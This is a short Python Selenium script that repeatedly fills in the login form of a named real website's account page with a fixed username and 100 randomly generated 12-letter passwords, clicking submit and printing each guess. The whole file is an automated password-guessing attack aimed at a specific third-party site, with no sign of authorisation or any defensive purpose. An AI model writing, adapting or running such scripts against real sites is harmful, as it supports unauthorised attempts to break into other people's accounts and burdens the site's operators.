from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import random
import string

driver = webdriver.Chrome()
letras = string.ascii_lowercase
driver.get("https://elitecenter.cl/my-account/")
for i in range(0,100):
    user = driver.find_element_by_id("username")
    user.clear()
    user.send_keys("Nombre")
    password = driver.find_element_by_id("password")
    password.clear()
    clave = ''.join(random.choice(letras) for i in range(12))
    password.send_keys(clave)

    click = driver.find_element_by_xpath("/html/body/div[1]/div[1]/div[2]/div/div/article/div/div/div[2]/div/div[1]/form/p[3]/button").click()
    print("Intento ",i+1," Contraseña: ", clave)